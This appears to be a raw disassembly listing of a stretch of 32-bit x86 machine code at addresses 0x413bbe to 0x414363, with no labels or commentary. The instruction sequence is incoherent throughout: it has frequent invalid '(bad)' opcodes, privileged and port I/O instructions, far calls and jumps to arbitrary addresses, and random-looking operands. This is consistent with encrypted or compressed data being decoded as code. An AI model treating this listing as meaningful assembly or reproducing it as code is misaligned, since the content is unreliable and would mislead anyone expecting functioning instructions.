  413bbe:	bound  ecx,QWORD PTR [edi+0x5d]
  413bc1:	sub    al,0x53
  413bc3:	pop    eax
  413bc4:	add    eax,0x76796fd0
  413bc9:	int3   
  413bca:	loop   0x413bd0
  413bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bcd:	mov    ah,0xd3
  413bcf:	cld    
  413bd0:	dec    edi
  413bd1:	cmp    DWORD PTR [ecx+0x7e],esi
  413bd4:	inc    ebx
  413bd5:	add    eax,0x3cf77d8e
  413bda:	aad    0x18
  413bdc:	fadd   DWORD PTR [edi-0x4]
  413bdf:	xchg   esi,eax
  413be0:	pop    ebx
  413be1:	mov    bl,0xf0
  413be3:	mov    WORD PTR [eax+esi*1-0xf],es
  413be7:	xor    ecx,0x9b508929
  413bed:	inc    ebp
  413bee:	jns    0x413c33
  413bf0:	fld    TBYTE PTR [edi-0x3f212e3a]
  413bf6:	xor    DWORD PTR [esi+0x4e],ecx
  413bf9:	mov    al,0x1d
  413bfb:	(bad)  
  413bfc:	and    al,0xb2
  413bfe:	add    bl,dh
  413c00:	xor    BYTE PTR [edx-0x64],cl
  413c03:	mov    ecx,0x5410b861
  413c08:	sbb    DWORD PTR [ebp+edx*2-0x68],esp
  413c0c:	fistp  QWORD PTR [edx-0x35f0d688]
  413c12:	lahf   
  413c13:	stos   BYTE PTR es:[edi],al
  413c14:	sub    dh,BYTE PTR fs:[edx+ecx*8+0x5b]
  413c19:	ror    BYTE PTR [edi+0x4daf6856],cl
  413c1f:	lods   eax,DWORD PTR ds:[esi]
  413c20:	(bad)  
  413c21:	dec    esi
  413c22:	mov    bh,ah
  413c24:	bound  ebp,QWORD PTR [edi-0x35979caf]
  413c2a:	mov    bh,0x79
  413c2c:	inc    ebx
  413c2d:	xor    ah,BYTE PTR [esi-0x7980ac5b]
  413c33:	rcl    DWORD PTR [edi],cl
  413c35:	push   esp
  413c36:	mov    ah,0x2
  413c38:	cmc    
  413c39:	pop    ds
  413c3a:	imul   edi,DWORD PTR [esi+0x35260405],0xfcda1552
  413c44:	ss in  eax,dx
  413c46:	xchg   ecx,eax
  413c47:	inc    eax
  413c48:	mov    ebp,0x4542d88f
  413c4d:	push   es
  413c4e:	lock push ebp
  413c50:	shl    DWORD PTR [esi],0xbb
  413c53:	sbb    al,0x37
  413c55:	jb     0x413cb3
  413c57:	ficomp DWORD PTR [ecx+0x419716be]
  413c5d:	(bad)  
  413c5e:	fldenv [esi-0x7976e822]
  413c64:	in     al,0xec
  413c66:	(bad)  
  413c67:	fisttp DWORD PTR [ecx]
  413c69:	fiadd  WORD PTR [ebp-0x27]
  413c6c:	dec    ebp
  413c6d:	pop    DWORD PTR [ecx+0x5b]
  413c70:	cmc    
  413c71:	add    BYTE PTR ds:0x4863542f,ch
  413c77:	aam    0xa6
  413c79:	dec    edx
  413c7a:	sbb    eax,0x893f1e84
  413c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c80:	shl    BYTE PTR [eax-0x3e],cl
  413c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c84:	cdq    
  413c85:	add    DWORD PTR [esi],ebp
  413c87:	hlt    
  413c88:	(bad)  
  413c89:	lea    esi,[eax]
  413c8b:	gs jnp 0x413cc9
  413c8e:	inc    ecx
  413c8f:	jnp    0x413c9e
  413c91:	dec    edi
  413c92:	(bad)  [edx-0x35]
  413c95:	into   
  413c96:	cmp    edx,ebx
  413c98:	dec    ebx
  413c99:	vpaddsw ymm5,ymm5,YMMWORD PTR [ecx+0x745d8253]
  413ca1:	adc    dh,BYTE PTR [edi]
  413ca3:	mov    ds:0x52ad93bc,eax
  413ca8:	repz adc esi,DWORD PTR [esi-0x3c]
  413cac:	or     BYTE PTR [edx-0x24],bh
  413caf:	add    dl,BYTE PTR [ebp-0x2]
  413cb2:	pop    ecx
  413cb3:	mov    al,0x4a
  413cb5:	into   
  413cb6:	inc    esp
  413cb7:	mov    esp,0xd4d8ccc9
  413cbc:	xchg   esp,eax
  413cbd:	mov    bl,cl
  413cbf:	dec    ebx
  413cc0:	adc    cl,BYTE PTR [edi-0x4e]
  413cc3:	pop    ecx
  413cc4:	fwait
  413cc5:	sub    bh,BYTE PTR [ebx-0x1fdd1eab]
  413ccb:	cs and al,0x6b
  413cce:	outs   dx,DWORD PTR ds:[esi]
  413ccf:	jbe    0x413c62
  413cd1:	sbb    eax,0x70d6e015
  413cd6:	cmp    al,0x90
  413cd8:	sbb    al,0x1b
  413cda:	and    al,0x66
  413cdc:	jmp    0x413d04
  413cde:	sub    ah,al
  413ce0:	in     al,dx
  413ce1:	stos   BYTE PTR es:[edi],al
  413ce2:	inc    esi
  413ce3:	into   
  413ce4:	pop    ss
  413ce5:	aam    0x66
  413ce7:	popf   
  413ce8:	pop    es
  413ce9:	icebp  
  413cea:	cwde   
  413ceb:	ins    BYTE PTR es:[edi],dx
  413cec:	enter  0x72be,0x2e
  413cf0:	iret   
  413cf1:	add    ebp,DWORD PTR [ebx+ecx*8-0x3aa197f8]
  413cf8:	xchg   esp,eax
  413cf9:	cli    
  413cfa:	mov    ds:0xdf79fc34,al
  413cff:	(bad)  
  413d00:	bound  ebp,QWORD PTR [edx]
  413d02:	call   0x3e468841
  413d07:	rol    DWORD PTR [edi-0x25],1
  413d0a:	loop   0x413d5f
  413d0c:	outs   dx,BYTE PTR ds:[esi]
  413d0d:	sbb    ebp,DWORD PTR [ebx+0x6f1b1347]
  413d13:	mov    cl,0x4f
  413d15:	retf   
  413d16:	mov    dh,0x11
  413d18:	xor    al,0xbb
  413d1a:	lds    eax,FWORD PTR ds:0x46435acf
  413d20:	sbb    ebp,ebx
  413d22:	pop    ebp
  413d23:	xor    ah,0x5e
  413d26:	cmp    ebx,DWORD PTR [ebp-0xd]
  413d29:	test   esi,ebx
  413d2b:	(bad)  
  413d2c:	outs   dx,DWORD PTR ds:[esi]
  413d2d:	inc    eax
  413d2e:	mov    eax,0x77716372
  413d33:	inc    esi
  413d34:	pop    edx
  413d35:	ins    BYTE PTR es:[edi],dx
  413d36:	sbb    eax,0xf5156a07
  413d3b:	je     0x413d58
  413d3d:	pushf  
  413d3e:	fsub   QWORD PTR ds:0x7a89df02
  413d44:	add    dl,ch
  413d46:	fs inc ecx
  413d48:	add    eax,0x8ebeabcc
  413d4d:	outs   dx,DWORD PTR ds:[esi]
  413d4e:	and    DWORD PTR [edx-0x7],esi
  413d51:	aas    
  413d52:	in     eax,0xfd
  413d54:	pop    edi
  413d55:	xor    eax,0x994271ce
  413d5a:	jns    0x413d16
  413d5c:	inc    esi
  413d5d:	sbb    ebx,DWORD PTR [edi]
  413d5f:	call   DWORD PTR [edx+0x74392941]
  413d65:	stos   DWORD PTR es:[edi],eax
  413d66:	iret   
  413d67:	pop    esp
  413d68:	out    dx,al
  413d69:	cdq    
  413d6a:	sbb    al,0xc7
  413d6c:	call   0x61d4:0x5054e921
  413d73:	inc    ebp
  413d74:	pushf  
  413d75:	xor    al,0xf7
  413d77:	mov    bl,0x7
  413d79:	cwde   
  413d7a:	mov    bh,0x56
  413d7c:	pop    ecx
  413d7d:	lods   eax,DWORD PTR ds:[esi]
  413d7e:	retf   0x882b
  413d81:	fs shl eax,0x50
  413d85:	enter  0xeaf8,0x44
  413d89:	push   0x15
  413d8b:	popf   
  413d8c:	push   esp
  413d8d:	or     esi,DWORD PTR [ebp+0x5f]
  413d90:	xchg   DWORD PTR [edx*8-0x64bbba4],ebx
  413d97:	mov    cl,0xc0
  413d99:	pusha  
  413d9a:	adc    cl,cl
  413d9c:	shl    BYTE PTR [ecx-0x341e659b],cl
  413da2:	cmc    
  413da3:	leave  
  413da4:	lods   eax,DWORD PTR ds:[esi]
  413da5:	inc    edi
  413da6:	ss pop esi
  413da8:	ret    0x4225
  413dab:	cdq    
  413dac:	(bad)  
  413dad:	jmp    0x19c1:0x2361ff2b
  413db4:	xor    BYTE PTR [eax-0x78],ch
  413db7:	loop   0x413d6e
  413db9:	fst    DWORD PTR [ebx-0x26]
  413dbc:	shl    DWORD PTR [ecx+0x62],1
  413dbf:	and    eax,0x8caf6373
  413dc4:	jg     0x413db2
  413dc6:	cs sub al,0x8d
  413dc9:	scas   al,BYTE PTR es:[edi]
  413dca:	sar    DWORD PTR [esi+0x7e],cl
  413dcd:	das    
  413dce:	mov    edx,0x43f4eae0
  413dd3:	and    esi,0xbafddcee
  413dd9:	mov    dh,dh
  413ddb:	clc    
  413ddc:	cmp    edi,edx
  413dde:	xor    eax,0x6d9ff494
  413de3:	mov    bh,0xc8
  413de5:	mov    eax,0x1947dcb0
  413dea:	xor    DWORD PTR [eax],eax
  413dec:	push   esi
  413ded:	pop    esi
  413dee:	xor    al,bl
  413df0:	lods   eax,DWORD PTR ds:[esi]
  413df1:	out    0x10,al
  413df3:	sbb    eax,0xd85bcaec
  413df8:	mov    esp,0x4b49d99b
  413dfd:	push   edi
  413dfe:	std    
  413dff:	aad    0x81
  413e01:	inc    ebp
  413e02:	cdq    
  413e03:	stc    
  413e04:	add    eax,0x5a3ae20e
  413e09:	xchg   edi,eax
  413e0a:	and    DWORD PTR ds:0xf60d0d0c,esp
  413e10:	out    dx,al
  413e11:	sbb    al,0x32
  413e13:	jo     0x413dca
  413e15:	pusha  
  413e16:	mov    ?,WORD PTR [edi-0x61]
  413e19:	daa    
  413e1a:	ret    
  413e1b:	inc    ecx
  413e1c:	aas    
  413e1d:	aad    0xa2
  413e1f:	jl     0x413db8
  413e21:	push   esi
  413e22:	dec    ebx
  413e23:	imul   esp,DWORD PTR ds:0x15be528,0x2a7c2254
  413e2d:	mov    WORD PTR [ebp-0x44],gs
  413e30:	jle    0x413e62
  413e32:	pop    ebp
  413e33:	cld    
  413e34:	adc    al,0x66
  413e36:	mov    ch,0x71
  413e38:	xor    eax,0xe0741eb7
  413e3d:	xor    DWORD PTR [ebx+0x441b59cc],esp
  413e43:	mov    ?,WORD PTR [edx]
  413e45:	mov    esi,0x75dc7c06
  413e4a:	and    al,0xbd
  413e4c:	pop    edx
  413e4d:	or     al,BYTE PTR [ebx]
  413e4f:	inc    ebx
  413e50:	outs   dx,BYTE PTR ds:[esi]
  413e51:	and    BYTE PTR [esi-0x5da036ee],0xce
  413e58:	or     eax,0xb5bf63b8
  413e5d:	and    BYTE PTR [edi+edx*4],ch
  413e60:	into   
  413e61:	pusha  
  413e62:	sbb    eax,0x282f01e5
  413e67:	push   0xffffff95
  413e69:	loop   0x413e34
  413e6b:	shl    DWORD PTR [ecx+edi*1+0x16],0x9e
  413e70:	lods   eax,DWORD PTR ds:[esi]
  413e71:	and    DWORD PTR [eax+0x31],0x5510138c
  413e78:	nop
  413e79:	sbb    DWORD PTR [edx+0xb],ecx
  413e7c:	inc    eax
  413e7d:	inc    dl
  413e7f:	fdivr  DWORD PTR [ebx]
  413e81:	das    
  413e82:	add    DWORD PTR [esi-0x1b3e2028],0x1a6fa0e0
  413e8c:	push   ebx
  413e8d:	std    
  413e8e:	sbb    bl,BYTE PTR [edx+ecx*8+0x1f]
  413e92:	(bad)  
  413e94:	fimul  WORD PTR [edx-0x42b262db]
  413e9a:	mov    ch,0x5
  413e9c:	jo     0x413e49
  413e9e:	ficom  WORD PTR [edx+0x2b6f651d]
  413ea4:	outs   dx,BYTE PTR ds:[esi]
  413ea5:	mov    ecx,?
  413ea7:	nop
  413ea8:	aas    
  413ea9:	aad    0xdf
  413eab:	(bad)  
  413eac:	cmp    eax,0xa16a8753
  413eb1:	mul    ah
  413eb3:	sbb    esi,DWORD PTR [ecx+0x2f]
  413eb6:	ret    0x8372
  413eb9:	cmc    
  413eba:	leave  
  413ebb:	add    al,0xd8
  413ebd:	mov    eax,DWORD PTR [eax]
  413ebf:	and    ebx,DWORD PTR [ebx-0x45]
  413ec2:	stos   BYTE PTR es:[edi],al
  413ec3:	lods   eax,DWORD PTR ds:[esi]
  413ec4:	ds gs test eax,0x6d02ad84
  413ecb:	and    eax,0xfc6a65d
  413ed0:	add    esi,ebx
  413ed2:	push   ebx
  413ed3:	mov    ecx,0x2d681c60
  413ed8:	add    DWORD PTR [edx+ebp*2+0x7b],ecx
  413edc:	jno    0x413f47
  413ede:	test   al,0xbf
  413ee0:	mov    esi,0xe5591225
  413ee5:	cmp    DWORD PTR ds:0xc10e2dd0,ebx
  413eeb:	fstp   TBYTE PTR [edx+0x3f]
  413eee:	repnz mov DWORD PTR [ebx+edx*4],esp
  413ef2:	mov    ds,WORD PTR [ebx]
  413ef4:	mov    bh,BYTE PTR [esp+ebp*2-0x746ca5f5]
  413efb:	call   0x793d2296
  413f00:	xchg   esp,eax
  413f01:	adc    al,0x31
  413f03:	mov    al,0xa
  413f05:	push   eax
  413f06:	add    eax,esp
  413f08:	imul   edi,DWORD PTR [ebx-0x5bd93d7f],0x4d4a7a10
  413f12:	push   0xffffff95
  413f14:	dec    ecx
  413f15:	or     al,0xc9
  413f17:	dec    ebx
  413f18:	lahf   
  413f19:	cmp    al,0x92
  413f1b:	mov    dl,0xfd
  413f1d:	in     eax,dx
  413f1e:	jecxz  0x413f65
  413f20:	outs   dx,BYTE PTR ds:[esi]
  413f21:	pop    es
  413f22:	test   ebx,0x8252bbc3
  413f28:	add    ebp,ebp
  413f2a:	or     ecx,edi
  413f2c:	adc    DWORD PTR [eax],eax
  413f2e:	fiadd  DWORD PTR [eax+0x6e]
  413f31:	adc    cl,bh
  413f33:	fidiv  WORD PTR [edi+0x66]
  413f36:	(bad)  
  413f37:	rol    DWORD PTR [esi-0x80],0xf8
  413f3b:	fidiv  DWORD PTR [ebx]
  413f3d:	xor    DWORD PTR [ecx+ecx*8],edx
  413f40:	jns    0x413fb4
  413f42:	arpl   di,cx
  413f44:	dec    eax
  413f45:	mov    BYTE PTR [esi-0x26],0x86
  413f49:	push   DWORD PTR [edx-0x9]
  413f4c:	mov    esi,eax
  413f4e:	ror    DWORD PTR [ecx],1
  413f50:	mov    ch,0xa7
  413f52:	xchg   ebx,eax
  413f53:	leave  
  413f54:	sbb    ecx,DWORD PTR [edx]
  413f56:	dec    bx
  413f58:	xchg   ecx,eax
  413f59:	mov    al,ds:0xe3d84c88
  413f5e:	mov    eax,ds:0xa523b48c
  413f63:	sbb    ebx,ebx
  413f65:	xor    cl,BYTE PTR [eax-0x64f99bf3]
  413f6b:	inc    ebx
  413f6c:	cmp    dh,al
  413f6e:	jae    0x413fb9
  413f70:	outs   dx,DWORD PTR ds:[esi]
  413f71:	xchg   ebp,eax
  413f72:	mov    bl,0xc7
  413f74:	out    0x48,al
  413f76:	test   al,0x8b
  413f78:	xor    eax,0x2eace227
  413f7d:	xchg   esi,eax
  413f7e:	mov    ah,0x4b
  413f80:	add    al,0x33
  413f82:	pop    esi
  413f83:	dec    edx
  413f84:	(bad)  
  413f85:	mov    cl,0x40
  413f87:	inc    esi
  413f88:	adc    al,0x5
  413f8a:	dec    ebx
  413f8b:	inc    esi
  413f8c:	imul   ebp,ebx,0xffffff9e
  413f8f:	pop    ecx
  413f90:	jle    0x413fc0
  413f92:	shl    DWORD PTR [esp+edi*8],0x24
  413f96:	fidivr DWORD PTR [edx+esi*2]
  413f99:	push   esi
  413f9a:	mov    esp,0x7c536a12
  413f9f:	push   ebp
  413fa0:	imul   esp,DWORD PTR [edx+0x5f51a7ea],0xc766e9e0
  413faa:	push   ebx
  413fab:	xchg   edx,eax
  413fac:	adc    ah,BYTE PTR [ebx]
  413fae:	mov    eax,0xf7972aa8
  413fb3:	mov    fs,WORD PTR ds:0x1944702f
  413fb9:	or     dl,BYTE PTR [edi-0x49]
  413fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fbd:	fstp   QWORD PTR [eax]
  413fbf:	out    0xd4,eax
  413fc1:	and    al,0xb
  413fc3:	lods   eax,DWORD PTR ds:[esi]
  413fc4:	mov    BYTE PTR [eax],cl
  413fc6:	int3   
  413fc7:	jbe    0x413faa
  413fc9:	(bad)
  413fcc:	xor    al,0xc2
  413fce:	ins    DWORD PTR es:[edi],dx
  413fcf:	mov    ah,BYTE PTR [esi]
  413fd1:	pop    ebx
  413fd2:	js     0x414002
  413fd4:	and    eax,0x7a897131
  413fd9:	jl     0x413fb8
  413fdb:	stos   BYTE PTR es:[edi],al
  413fdc:	dec    ebp
  413fdd:	addr16 pushf 
  413fdf:	jmp    0x413fec
  413fe1:	ss jmp 0x414004
  413fe4:	(bad)  
  413fe5:	ds call 0x7ee883a9
  413feb:	jecxz  0x414026
  413fed:	(bad)  
  413fee:	adc    DWORD PTR [ebp+0x7a],esi
  413ff1:	stos   BYTE PTR es:[edi],al
  413ff2:	dec    esp
  413ff3:	mov    BYTE PTR [ecx+0x1e8191b7],dl
  413ff9:	loope  0x413fbd
  413ffb:	out    dx,eax
  413ffc:	es adc al,0x9a
  413fff:	jbe    0x41404e
  414001:	or     al,0x35
  414003:	ins    BYTE PTR es:[edi],dx
  414004:	push   esi
  414005:	and    BYTE PTR [edx+0x19],ah
  414008:	lahf   
  414009:	dec    ebp
  41400a:	push   ecx
  41400b:	fidiv  DWORD PTR [ecx]
  41400d:	mov    al,ds:0x933ef3d3
  414012:	xchg   ebx,eax
  414013:	(bad)  
  414014:	jns    0x41402a
  414016:	addr16 call 0x73a34621
  41401c:	jno    0x41402d
  41401e:	icebp  
  41401f:	pop    edx
  414020:	mov    bh,0xfb
  414022:	scas   al,BYTE PTR es:[edi]
  414023:	pop    ebp
  414024:	imul   ebp,DWORD PTR [edi],0xffffffb9
  414027:	inc    ebp
  414028:	and    DWORD PTR [ebx-0x514d9ba5],0xffffffb7
  41402f:	inc    eax
  414030:	jmp    0x4140b1
  414032:	lock ds je 0x413fb6
  414036:	sub    edx,edi
  414038:	mov    al,0xfb
  41403a:	and    BYTE PTR [ebx+eax*4],0x58
  41403e:	stos   BYTE PTR es:[edi],al
  41403f:	sar    DWORD PTR [edx],cl
  414041:	mov    ds:0xa9862f1c,eax
  414046:	shl    ch,cl
  414048:	loopne 0x414006
  41404a:	fistp  QWORD PTR [edx]
  41404c:	pop    ss
  41404d:	xchg   BYTE PTR [ebp-0x976ffda],bh
  414053:	dec    ebp
  414054:	icebp  
  414055:	call   0xcc14:0x4a1779a3
  41405c:	outs   dx,DWORD PTR ds:[esi]
  41405d:	jmp    0xef3e:0x8a734dee
  414064:	jg     0x4140cb
  414066:	(bad)  
  414067:	jmp    0xba228d62
  41406c:	xchg   edi,eax
  41406d:	je     0x4140e7
  41406f:	xor    al,BYTE PTR [esp+ebp*8+0xeabbc7b]
  414076:	fstp   TBYTE PTR [eax+0x2607d76f]
  41407c:	shr    BYTE PTR [esi+0xc97a1e8],cl
  414082:	mov    ebx,0xdf2bf1d3
  414087:	in     al,0xad
  414089:	fbstp  TBYTE PTR [ecx+0x47]
  41408c:	mov    bh,0x0
  41408e:	mov    ds:0x5dc96b81,eax
  414093:	lods   eax,DWORD PTR ds:[esi]
  414094:	push   ebp
  414095:	loop   0x4140f2
  414097:	fdivr  DWORD PTR [ebp+ebp*8-0x6b6fbca9]
  41409e:	add    DWORD PTR [esi-0x353b92bf],ebx
  4140a4:	call   0x59ba36ac
  4140a9:	push   ebp
  4140aa:	(bad)  
  4140ab:	pop    ss
  4140ac:	mov    esp,0xa0432868
  4140b1:	cwde   
  4140b2:	addr16 mov ds:0x5351,al
  4140b6:	fnstcw WORD PTR [edx]
  4140b8:	push   edx
  4140b9:	inc    esi
  4140ba:	call   0x9972:0xe05503a5
  4140c1:	and    ecx,DWORD PTR [eax-0x5244828b]
  4140c7:	fs pop es
  4140c9:	pop    ss
  4140ca:	outs   dx,BYTE PTR ds:[esi]
  4140cb:	enter  0xc422,0xad
  4140cf:	adc    al,0x31
  4140d1:	sbb    BYTE PTR [eax],ah
  4140d3:	inc    edx
  4140d4:	lea    eax,[ebp+0x79]
  4140d7:	fcomp  DWORD PTR [ecx+0x5709f434]
  4140dd:	das    
  4140de:	xlat   BYTE PTR ds:[ebx]
  4140df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140e0:	(bad)  
  4140e2:	icebp  
  4140e3:	or     DWORD PTR [esp+ebx*4-0x29],0x38f43b4f
  4140eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ec:	push   ebp
  4140ed:	inc    edx
  4140ee:	fstp   DWORD PTR [esp+eiz*2-0x5e]
  4140f2:	shl    DWORD PTR [edi],1
  4140f4:	(bad)  
  4140f5:	inc    ecx
  4140f6:	lock aas 
  4140f8:	cwde   
  4140f9:	fs clc 
  4140fb:	push   ss
  4140fc:	sti    
  4140fd:	cbw    
  4140ff:	jb     0x414126
  414101:	push   0x853765f3
  414106:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  414108:	mov    ebx,0x7b9adcc5
  41410d:	mov    ebx,0xda09532a
  414112:	push   ss
  414113:	adc    BYTE PTR [edx-0x6aa28582],bh
  414119:	push   ebx
  41411a:	push   es
  41411b:	and    ebp,DWORD PTR [esi-0x20cad6c0]
  414121:	pop    ds
  414122:	push   eax
  414123:	dec    esp
  414124:	adc    ecx,DWORD PTR [eax+0xbb27cd7]
  41412a:	jp     0x4140e4
  41412c:	scas   eax,DWORD PTR es:[edi]
  41412d:	adc    ebp,DWORD PTR [ebp+0x3b]
  414130:	sbb    al,ch
  414132:	fcom   QWORD PTR [ecx]
  414134:	xlat   BYTE PTR ds:[ebx]
  414135:	cmp    BYTE PTR [ecx],dl
  414137:	sub    ch,BYTE PTR [ebp-0x2a30bc31]
  41413d:	sbb    DWORD PTR [edx+0x47aa038a],ecx
  414143:	pushf  
  414144:	into   
  414145:	add    eax,esi
  414147:	jl     0x41415a
  414149:	loop   0x4140cc
  41414b:	aas    
  41414c:	add    bl,BYTE PTR [eax+eax*1+0xc]
  414150:	xchg   eax,ebx
  414152:	stc    
  414153:	shr    DWORD PTR [esi],1
  414155:	(bad)  
  414156:	call   0x37c8ad75
  41415b:	add    eax,0xf362fdd
  414160:	stc    
  414161:	push   eax
  414162:	sahf   
  414163:	xchg   ecx,eax
  414164:	xor    bl,BYTE PTR [edi-0x48]
  414167:	xchg   edx,eax
  414168:	cld    
  414169:	enter  0x68c7,0x81
  41416d:	mov    edx,0xce7f9f96
  414172:	xchg   esi,eax
  414173:	fdivr  st(7),st
  414175:	or     al,0x83
  414177:	pop    ds
  414178:	dec    ecx
  414179:	pop    esi
  41417a:	pop    eax
  41417b:	mov    WORD PTR [esi+0x14],gs
  41417e:	mov    ds:0x5ed2f6bd,eax
  414183:	(bad)  
  414184:	call   0x33639603
  414189:	stc    
  41418a:	push   esi
  41418b:	cli    
  41418c:	in     al,dx
  41418d:	call   0xb505:0x6d1000d5
  414194:	cmp    ch,BYTE PTR [esi]
  414196:	je     0x4141a1
  414198:	jnp    0x41418f
  41419a:	and    DWORD PTR [ebp+0x2da4ffc5],0xffffffc4
  4141a1:	dec    ebp
  4141a2:	div    ecx
  4141a4:	loop   0x4141a3
  4141a6:	and    eax,DWORD PTR [eax+0x1f]
  4141a9:	pop    ds
  4141aa:	out    dx,eax
  4141ab:	mov    edx,0xa3fadfa2
  4141b0:	sub    BYTE PTR [eax+0x71b3182],cl
  4141b6:	mov    ebx,0xdca7b2b2
  4141bb:	cwde   
  4141bc:	popf   
  4141bd:	pop    ebx
  4141be:	mov    al,ds:0x5cc196d8
  4141c3:	mov    ecx,0x95376f2
  4141c8:	and    eax,0x29307989
  4141cd:	ffreep st(7)
  4141cf:	lea    ecx,ds:0x9bb58ee
  4141d5:	cmp    BYTE PTR [ecx],ch
  4141d7:	xchg   esi,eax
  4141d8:	jecxz  0x4141e0
  4141da:	call   0x6f0b:0x5cb4c8e
  4141e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141e2:	in     al,dx
  4141e3:	mov    es,WORD PTR [esi+edi*1]
  4141e6:	xchg   ecx,eax
  4141e7:	(bad)  
  4141e8:	cld    
  4141e9:	mul    ecx
  4141eb:	imul   edx,DWORD PTR [eax],0x3d52bc68
  4141f1:	cmp    edi,DWORD PTR [eax-0x70]
  4141f4:	dec    edi
  4141f5:	xchg   ebx,eax
  4141f6:	arpl   WORD PTR fs:[edx+0x6b],ax
  4141fa:	outs   dx,DWORD PTR ds:[esi]
  4141fb:	js     0x414223
  4141fd:	xchg   esp,eax
  4141fe:	mov    eax,0x5623531f
  414203:	push   ds
  414204:	je     0x414242
  414206:	mov    ?,WORD PTR [edi+edx*1-0x34dd39e6]
  41420d:	add    al,0x31
  41420f:	gs jne 0x414268
  414212:	(bad)
  414215:	jbe    0x414212
  414217:	mov    esi,0x99ae5120
  41421c:	add    ebx,DWORD PTR [edx+0x26]
  41421f:	xchg   esi,eax
  414220:	ret    
  414221:	adc    al,0x9f
  414223:	(bad)  
  414224:	js     0x414298
  414226:	int    0x18
  414228:	ss mov al,0x18
  41422b:	xchg   BYTE PTR [edi],al
  41422d:	mov    dh,0x4a
  41422f:	and    esi,ecx
  414231:	push   ds
  414232:	leave  
  414233:	data16 mov bl,0xb5
  414236:	inc    eax
  414237:	rol    ecx,0xca
  41423a:	sbb    ecx,DWORD PTR [di-0x57d5]
  41423f:	data16 lahf 
  414241:	xor    dh,dl
  414243:	pop    ebp
  414244:	push   cs
  414245:	pop    ebp
  414246:	popf   
  414247:	cdq    
  414248:	loope  0x414223
  41424a:	stos   DWORD PTR es:[edi],eax
  41424b:	cdq    
  41424c:	adc    DWORD PTR [ecx-0x69002c40],ebp
  414252:	xor    edx,DWORD PTR [edx-0x62]
  414255:	shr    dl,0x68
  414258:	imul   ecx,DWORD PTR [ecx],0x89dfca76
  41425e:	mov    esp,DWORD PTR [edi-0x21]
  414261:	call   0x4eff:0xa8d7357c
  414268:	pop    ecx
  414269:	xor    DWORD PTR [ecx+0x23],0x33
  41426d:	lahf   
  41426e:	popa   
  41426f:	jle    0x4142c7
  414271:	xlat   BYTE PTR ds:[ebx]
  414272:	xchg   edi,eax
  414273:	inc    edx
  414274:	in     eax,dx
  414275:	xchg   edi,eax
  414276:	xor    bh,BYTE PTR [eax*2+0x7c460fa6]
  41427d:	pusha  
  41427e:	sbb    DWORD PTR ss:[edx],edx
  414281:	scas   al,BYTE PTR es:[edi]
  414282:	dec    edi
  414283:	dec    edi
  414284:	dec    ecx
  414285:	inc    ecx
  414286:	sti    
  414287:	jmp    0x46453ec6
  41428c:	loope  0x4142a7
  41428e:	dec    edx
  41428f:	scas   al,BYTE PTR es:[edi]
  414290:	mov    ch,0xb6
  414292:	sbb    eax,0xf734662a
  414297:	out    0x62,eax
  414299:	jmp    0x75d:0xfcc5501b
  4142a0:	outs   dx,DWORD PTR ds:[esi]
  4142a1:	jb     0x41426d
  4142a3:	cmp    eax,DWORD PTR [ebp-0x478f593f]
  4142a9:	(bad)  
  4142aa:	in     eax,dx
  4142ab:	pop    esp
  4142ac:	mov    al,0x59
  4142ae:	enter  0xf95d,0x57
  4142b2:	cmc    
  4142b3:	leave  
  4142b4:	(bad)  
  4142b5:	ret    0xcc72
  4142b8:	aad    0xed
  4142ba:	push   cs
  4142bb:	mov    ds:0xb789b132,al
  4142c0:	add    al,0x3
  4142c2:	mov    ecx,0x3ddf462a
  4142c7:	mov    ebp,0xe40d7d9a
  4142cc:	mov    ebp,DWORD PTR [edx-0xace4129]
  4142d2:	lahf   
  4142d3:	pop    edi
  4142d4:	cli    
  4142d5:	in     al,0x16
  4142d7:	ror    ebx,0xc8
  4142da:	push   edi
  4142db:	or     eax,0xb3944b4d
  4142e0:	xlat   BYTE PTR ds:[ebx]
  4142e1:	mov    edx,0xbc042da1
  4142e6:	loope  0x4142d8
  4142e8:	shl    BYTE PTR [esi],0x4c
  4142eb:	or     DWORD PTR [esi-0x68],ebp
  4142ee:	add    al,0xdb
  4142f0:	mov    edx,0x45148462
  4142f5:	push   es
  4142f6:	shl    BYTE PTR [eax+ecx*4],cl
  4142f9:	dec    ebp
  4142fa:	dec    ecx
  4142fb:	mov    ds,WORD PTR [eax+0x63]
  4142fe:	ins    BYTE PTR es:[edi],dx
  4142ff:	loopne 0x414364
  414301:	xor    esi,eax
  414303:	(bad)  
  414305:	inc    ebp
  414306:	push   cs
  414307:	xor    edi,ecx
  414309:	inc    eax
  41430a:	and    dl,BYTE PTR [ebx+0x52]
  41430d:	outs   dx,BYTE PTR ds:[esi]
  41430f:	cs jnp 0x41430a
  414312:	lea    ecx,[esi]
  414314:	dec    ebx
  414315:	dec    eax
  414316:	push   eax
  414317:	pop    esi
  414318:	sti    
  414319:	inc    edi
  41431a:	xor    DWORD PTR [edi-0x73],esp
  41431d:	push   ecx
  41431e:	dec    esi
  41431f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414320:	lahf   
  414321:	lahf   
  414322:	mov    dh,0x3f
  414324:	cli    
  414325:	inc    eax
  414326:	fsubr  st,st(7)
  414328:	adc    al,0x3c
  41432a:	jb     0x414391
  41432c:	aad    0x86
  41432e:	pop    ebp
  41432f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414330:	sti    
  414331:	cmp    ah,BYTE PTR [edi+0x6a]
  414334:	dec    edi
  414335:	adc    al,0xa7
  414337:	sbb    eax,0xd00f278a
  41433c:	push   eax
  41433d:	popa   
  41433e:	and    ebx,DWORD PTR [eax-0x20]
  414341:	jmp    0x35c1:0x1f7432d0
  414348:	ss call 0x2ed0:0x5f540553
  414350:	xor    DWORD PTR [eax+eiz*8],eax
  414353:	mov    ah,0x50
  414355:	aaa    
  414356:	das    
  414357:	jne    0x41433e
  414359:	pop    es
  41435a:	sub    BYTE PTR [ebx],dl
  41435c:	fwait
  41435d:	movntq QWORD PTR [ecx+0x74],mm2
  414361:	push   edx
  414362:	popa   
  414363:	cli    
